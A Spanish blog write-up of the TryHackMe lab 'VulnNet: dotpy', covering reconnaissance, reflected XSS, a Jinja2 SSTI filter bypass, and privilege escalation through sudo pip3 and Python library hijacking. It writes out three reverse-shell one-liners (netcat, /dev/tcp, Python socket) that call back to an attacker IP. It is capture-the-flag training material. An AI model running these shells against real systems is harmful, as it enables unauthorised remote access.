---
layout: single
title: VulnNet:dotpy - TryHackMe
excerpt: "Debemos encontrar 2 banderas. Donde a partir de un escaneo de puertos pude saber que hay un servidor web que aloja una aplicación web, que está compuesta de un login, y de un registro. Luego, cree una cuenta para observar el panel de gestión de la aplicación web donde la mayoría de sus funcionalidades no están desarrolladas aún por lo que no representan un vector de ataque. Luego, realice fuerza bruta de directorios en el directorio raíz del servidor web, logrando encontrar un error que nos condujo a una página web con vulnerabilidad XSS Reflected y SSTI. Luego, encontré el tipo template engine, y probe diferentes payloads para omitir el blacklist, y lograr generar una reverse Shell. Luego, para la escalada de privilegio horizontal, aproveche que podía ejecutar el administrador de paquetes pip para instalar paquetes Python con privilegios de otro usuario, y en la escalada vertical, utilice la técnica Python Library Hijacking y la configuración SETENV habilitada en un comando a traves de sudo."
date: 2023-11-16	
classes: wide
header:
  teaser: /assets/images/dopsty/image002.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - HTTP
  - XSS
  - SETENV
  - pip3
  - Python Library Hijacking
  - Sudo
  - HTML
  - SSTI
  - Gobuster
  - RCE
  - Python
---

![](/assets/images/dopsty/image001.png)

## SUMMARY

Debemos encontrar 2 banderas. Donde a partir de un escaneo de puertos pude saber que hay un servidor web que aloja una aplicación web, que está compuesta de un login, y de un registro. Luego, cree una cuenta para observar el panel de gestión de la aplicación web donde la mayoría de sus funcionalidades no están desarrolladas aún por lo que no representan un vector de ataque. Luego, realice fuerza bruta de directorios en el directorio raíz del servidor web, logrando encontrar un error que nos condujo a una página web con vulnerabilidad XSS Reflected y SSTI. Luego, encontré el tipo template engine, y probe diferentes payloads para omitir el blacklist, y lograr generar una reverse Shell. Luego, para la escalada de privilegio horizontal, aproveche que podía ejecutar el administrador de paquetes pip para instalar paquetes Python con privilegios de otro usuario, y en la escalada vertical, utilice la técnica Python Library Hijacking y la configuración SETENV habilitada en un comando a traves de sudo.

## FASE RECONOCIMIENTO ACTIVO

En este caso debemos acceder al sistema destino y obtener las banderas. Para ello empezaremos utilizando el comando openvpn con el fin de establecer una conexión VPN con la red virtual dónde está la máquina VulnNet dotpy. Para ello utilizaremos el archivo de configuración, que lo podemos descargar en la plataforma de Tryhackme, que puede incluir información como la dirección del servidor VPN, los certificados y claves de seguridad, la configuración de encriptación, etc.

![](/assets/images/dopsty/image003.png)

Luego de que se establece la conexión VPN se crea una interfaz virtual de red en nuestra máquina. Donde se enruta todo el tráfico de red a través de esa interfaz.

![](/assets/images/dopsty/image004.png)

Además, la plataforma de Tryhackme nos muestra la dirección IP de la máquina VulnNet dotpy.

![](/assets/images/dopsty/image005.png)

## FASE ESCANEO Y ENUMERACION

Luego pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del nodo. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo del sistema destino. Para ello utilizaremos `Nmap`. Donde le pasaremos los siguientes parámetros:

- El parámetro -sC o –script=”default” para utilizar todos los scripts de la categoría default con el fin de realizar un escaneo y detección de los puertos de manera avanzada.
- El parámetros -sV con el fin de conocer las versiones de los servicios levantados en los puertos abiertos.
- El parámetro -n para evitar la resolución DNS, y el parámetro –max-rate para indicarle el número máximo de paquetes por segundo que va a utilizar Nmap para el escaneo con el fin de evitar sobrecargar la red con el tráfico generado por la herramienta.
- El parámetro -Pn para evitar que Nmap, que realice ningún tipo de sondeo o ping hacia el sistema destino con el fin de determinar si el host está vivo o activo, y realice el escaneo de puertos directamente.
- El parámetro -p- para realizar un escaneo de los 65535 puertos del nodo y el parámetro –open con el fin de que nos muestre información solo de los puertos abiertos.

![](/assets/images/dopsty/image006.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- Un programa servidor Web en el puerto 8080. Además, observamos que el servidor esta implementado en el lenguaje de programación Python. Además, podemos observar que hay una pagina web almacenada en el servidor cuya etiqueta HTML title toma el valor de “VulnNet Entertainment – Login | Discover”. Además, podemos observar la URL de la página web.

Ahora accederemos a la pagina web a traves de mi navegador web.

![](/assets/images/dopsty/image007.png)

![](/assets/images/dopsty/image008.png)

Podemos observar que se trata de una aplicación web alojada en el servidor web que consta de un login y de un registro.

Ahora crearemos una cuenta en el registro con el fin de poder autenticarnos exitosamente y analizar el panel de administración de la aplicación web.

![](/assets/images/dopsty/image009.png)

![](/assets/images/dopsty/image010.png)

Luego, de tomarnos un buen tiempo analizando el código fuente de cada sección de la página web con el fin de darnos encontrar alguna funcionalidad que realice una solicitud hacia un endpoint de una API, pero nos damos cuenta de que sus funcionalidades no están desarrolladas del todo, por lo que mas parece un sitio web estático.

Ahora realizaremos fuerza bruta de directorios sobre el directorio raíz del servidor web con el fin de encontrar recursos escondidos a parte del directorio correspondiente a la aplicación web.

![](/assets/images/dopsty/image011.png)

Podemos observar que recibimos un mensaje de error donde se nos muestra una ruta de un recurso, pero al parecer el código de estado HTTP de la respuesta HTML obtenida por el servidor web al momento de realizar la solicitud por el recurso, es 403. Pero la respuesta HTML tiene un numero de caracteres de 3000 en su cuerpo, por lo que es bastante atípico.

Ahora accederemos a este recurso a traves del navegador web.

![](/assets/images/dopsty/image012.png)

## FASE GANAR ACCESSO O EXPLOTACION O HACKING

Podemos observar que el código de estado HTTP que aparece en el cuerpo de la respuesta HTML es 404. Además, el nombre del recurso se ve reflejada en el cuerpo de la respuesta HTML. Por lo que podemos probar si es vulnerable XSS reflected., insertando un payload en JavaScript que me genera una ventana emergente con cierto mensaje.

![](/assets/images/dopsty/image013.png)

Podemos observar que si es vulnerable a XSS reflected.

Ahora probaremos si es vulnerable a SSTI. Para ello introduciremos los siguientes payloads con el fin de observar un error emitido por el template engine en el cuerpo de respuesta HTML del servidor.

![](/assets/images/dopsty/image014.png)

![](/assets/images/dopsty/image015.png)

Podemos observar que con el payload {{}}, logramos obtener un mensaje de erro emitido por el template engine. Por lo tanto, si es vulnerable a SSTI. Además, logramos saber que el template engine es jinja2. Además, esa página web con ese dato volátil ha sido creada a partir de un template jinja2.

Ahora que sabemos el template engine, podemos adecuar nuestros payloads a la sintaxis del template engine jinja2. Para ello utilizaremos algunos payloads de la página web HackTricks con el fin de ejecutar comandos de manera remota en el sistema operativo del servidor.

![](/assets/images/dopsty/image016.png)

![](/assets/images/dopsty/image017.png)

Podemos observar que se ha implementado una lista negra con el fin de evitar que se introduzcan ciertos caracteres potencialmente peligrosos.

Ahora si buscamos en el motor de búsqueda de Google, maneras de como omitir filtros en un template engine jinja2, nos topamos con este repositorio Github `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---filter-bypass`, que contiene un payload para omitir la mayoría de los filtros mas comunes.

![](/assets/images/dopsty/image018.png)

Podemos observar que este payload va a ejecutar el comando id de manera remota en el servidor. Ahora decodificaremos en URL este payload y lo probaremos.

![](/assets/images/dopsty/image019.png)

![](/assets/images/dopsty/image020.png)

Podemos observar que logramos omitir los caracteres prohibidos listados en la blacklist.

Ahora ajustaremos el payload para generar una reverse Shell con el fin de obtener acceso al sistema destino, pero antes habilitaremos el puerto 1800 en nuestro sistema para escuche la conexión entrante de la reverse Shell.

- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.123.194 4444 >/tmp/f`

![](/assets/images/dopsty/image021.png)

- `sh -i >& /dev/tcp/10.8.123.194/4444 0>&1`

![](/assets/images/dopsty/image022.png)

- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.123.194",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

![](/assets/images/dopsty/image023.png)

Luego, de probar varios payloads, nos encontramos con un payload en Python, `python -c 'import socket, subprocess, os;s=socket. socket (socket.AF_INET, socket. SOCK_STREAM);s.connect(("10.8.123.194",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")',` que contiene algunos caracteres que son prohibidos debido al blacklist configurado. Por lo que, para omitir este filtro, utilizaremos la codificación hexadecimal sobre nuestro payload.

![](/assets/images/dopsty/image024.png)

![](/assets/images/dopsty/image025.png)

![](/assets/images/dopsty/image026.png)

![](/assets/images/dopsty/image027.png)

De esta manera logramos obtener acceso al sistema destino mediante la vulnerabilidad SSTI, y teniendo los privilegios del usuario local web.

Ahora ejecutaremos los siguientes comandos para convertir nuestra reverse Shell más interactiva y estable.

![](/assets/images/dopsty/image028.png)

## FASE ESCALADA PRIVILEGIOS

Ahora buscaremos vectores de escalada de privilegios. Para ello enumeraremos los comandos o programas que se pueden ejecutar con privilegios elevados a traves del comando sudo.

![](/assets/images/dopsty/image029.png)

Podemos observar que podemos instalar paquetes Python en el directorio donde se ejecute el comando, con los privilegios del usuario system-admin, y sin la necesidad de ingresar nuestras credenciales.

Ahora teniendo en cuenta esto crearemos el archivo setup.py, que comúnmente viene a contener información sobre el paquete Python que se pretende instalar. Además, este archivo contendrá una serie de comandos que nos generará una reverse Shell. Luego, ejecutaremos el comando `sudo -u system-adm /usr/bin/pip3 install .` , con el fin de que el administrador de paquetes Python pip ejecute el archivo setup.py, y de esa manera obtendremos nuestra reverse Shell.

![](/assets/images/dopsty/image030.png)

![](/assets/images/dopsty/image031.png)

De esta manera realizamos una escalada de privilegio horizontal.

Ahora ejecutaremos los siguientes comandos para hacer que la reverse Shell sea mas estable e interactiva.

![](/assets/images/dopsty/image032.png)

Ahora seguiremos buscando vectores de escalada de privilegios. Para ello enumeraremos los comandos o programas que se pueden ejecutar con privilegios elevados a traves del comando sudo.

![](/assets/images/dopsty/image033.png)

Podemos observar que podemos ejecutar el script backup.py con los privilegios de cualquier usuario a traves de sudo, y sin la necesidad de proveer las credenciales del usuario local system-adm. Además, otro detalle importante es que la configuración `SETENV` esta habilitada en el comando. Por lo tanto, podemos establecer valores a ciertas variables de entorno con el fin de evitar de que sus valores se eliminen cuando ejecutemos el comando a traves de sudo (Esto sucede debido a la configuración `env_reset`, y viene a ser una medida de seguridad contra la manipulación de variables de entorno).

Ahora observaremos el contenido del script backup.py.

![](/assets/images/dopsty/image034.png)

Podemos observar que este script importa el `módulo zipfile`. Por lo tanto, podemos utilizar la técnica Python Library Hijacking con el fin de realizar una suplantación de la librería zipfile original por una maliciosa.

![](/assets/images/dopsty/image035.png)

Ahora debemos hacer que el intérprete de Python logro encontrar primero nuestra librería maliciosa antes de la legitima. Para ello, utilizaremos la configuración `SETENV` con el fin de establecer un valor a la variable de entorno `PYTHONPATH`, que especifica una lista de directorios donde el interprete de Python busca módulos y paquetes antes de intentar impórtalos. El valor que le estableceremos a la variable de entorno `PYTHONPATH` va a ser la ruta de nuestro directorio donde almacenamos el `módulo ziplfile` suplantador con el fin de que sea ejecutado por el interprete de Python.

![](/assets/images/dopsty/image036.png)

![](/assets/images/dopsty/image037.png)

De esta manera realizamos una escalada de privilegio vertical.

Ahora buscaremos las dos banderas en el sistema de archivos del sistema destino.

![](/assets/images/dopsty/image038.png)
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 



































